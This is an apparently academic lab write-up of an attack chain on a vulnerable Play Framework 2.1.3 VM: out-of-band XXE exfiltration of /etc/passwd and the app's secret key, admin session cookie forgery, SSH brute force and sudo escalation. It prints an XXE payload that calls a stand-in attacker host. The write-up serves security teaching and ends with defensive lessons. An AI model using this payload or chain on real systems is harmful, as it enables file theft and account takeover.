XXE & Cookie Forgery on Play Framework

End-to-end exploitation of a vulnerable Play Framework 2.1.3 application, combining XXE Out-of-Band attacks, secret disclosure, and session forgery.

Read Tutorial

Overview

This write-up documents a full web exploitation chain performed in a controlled academic environment. The target application was developed using Play Framework 2.1.3, an outdated version affected by multiple security flaws.

The attack combines an XML External Entity (XXE) vulnerability (CVE-2014-3630) with weaknesses in Play Framework’s stateless session cookie mechanism, ultimately leading to administrator impersonation and full system compromise.

Target Environment

  • Framework: Play Framework 2.1.3
  • Architecture: MVC (Model-View-Controller)
  • Server OS: Linux (VirtualBox VM)
  • Attacker OS: Kali Linux
  • Vulnerabilities: XXE (OOB) + Session Cookie Forgery

Vulnerability Description

Although the web application communicates with the backend using JSON, the server-side endpoint still processes XML requests. The XML parser used by Play Framework 2.1.3 does not fully disable external entity resolution, making it vulnerable to XXE attacks.

While in-band XXE responses are restricted, the parser allows external DTD resolution, enabling an Out-of-Band (OOB) XXE attack to exfiltrate sensitive files.

Attack Phases

1. Reconnaissance

The attack began with network reconnaissance using Nmap to identify exposed services on the target host (192.168.1.177). 

nmap -sC -sV 192.168.1.177

The scan revealed three open services:

  • TCP 22 – OpenSSH
  • TCP 80 – HTTP (Apache)
  • TCP 3306 – MySQL

Directory enumeration using dirb uncovered a login endpoint, confirming the presence of authentication functionality.

2. XXE Exploitation (Out-of-Band)

A valid login request was intercepted using FoxyProxy and Burp Suite. The request was modified to:

  • Change the Content-Type to text/xml
  • Inject a malicious XML payload
<!DOCTYPE data [
  <!ENTITY % ext SYSTEM "http://attacker-ip:3000/evil.dtd">
  %ext;
]>
<data>test</data>

A malicious external DTD hosted on the attacker machine instructed the server to read local files and exfiltrate them via HTTP requests.

Using this technique, sensitive files such as /etc/passwd were successfully extracted.

3. Play Framework Session Cookie Forgery

Analysis of /etc/passwd revealed a play user and installation directory. Further XXE exploitation allowed access to: 

/opt/play-2.1.3/conf/application.conf

This configuration file contained the Play secret key, used to cryptographically sign session cookies.

By reviewing Play Framework source code, the session encoding and signing process was replicated in Python, allowing the creation of a valid administrator session cookie.

Once injected into the browser, the application immediately recognized the session as an authenticated administrator.

4. Post-Exploitation

With system user information obtained earlier, a brute-force attack against SSH was performed using Metasploit.

Access was gained as the pentesterlab user. Since this user had sudo privileges, privilege escalation to root was trivial. 

sudo su

Tools Used

  • Nmap – Network reconnaissance
  • dirb – Directory enumeration
  • FoxyProxy – Proxy redirection
  • Burp Suite – Request interception and modification
  • Python http.server – Hosting malicious DTD
  • Netcat – OOB data capture
  • Metasploit – SSH brute force

Security Lessons

  • Always disable external entity resolution in XML parsers
  • Never rely on client-side session storage for sensitive state
  • Protect cryptographic secrets with strict file permissions
  • Keep frameworks and dependencies updated
